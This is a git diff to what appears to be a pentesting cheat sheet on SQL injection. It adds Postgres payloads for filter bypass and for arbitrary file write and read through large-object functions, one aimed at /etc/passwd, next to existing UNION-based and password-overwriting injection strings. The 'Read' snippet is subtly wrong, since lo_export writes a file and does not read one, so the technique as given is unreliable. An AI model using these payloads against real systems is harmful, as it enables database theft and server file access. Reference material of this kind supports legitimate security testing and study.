@@ -121,6 +121,9 @@ username[$eq]=admin&password[$eq]=admin
 > SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.
 > It generally allows an attacker to view data that they are not normally able to retrieve. - [Source](https://portswigger.net/web-security/sql-injection)
 
+
+Interesting [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) of Port Swigger.
+
 ## Manual
 ### Common pattern
 ```
@@ -150,6 +153,25 @@ admin", "") ON DUPLICATE KEY UPDATE password="newpasswd";
 ```
 " UNION SELECT * FROM users
 " ; SELECT * FROM users
+```
+
+### Interesting postgres function
+
+#### Filter bypass
+```
+query_to_xml('SELECT * FROM users', true, false, '')
+ts_stat('SELECT * FROM users')::text
+```
+
+#### Arbitrary read / write
+```
+# Write
+lo_from_bytea(31337, decode('bG9saXBvcAo=', 'base64'))
+lo_export(31337, '/tmp/lolipop')
+
+# Read
+lo_export(31338, '/etc/passwd')
+lo_get(31338)
 ```
 
 ## SQLmap
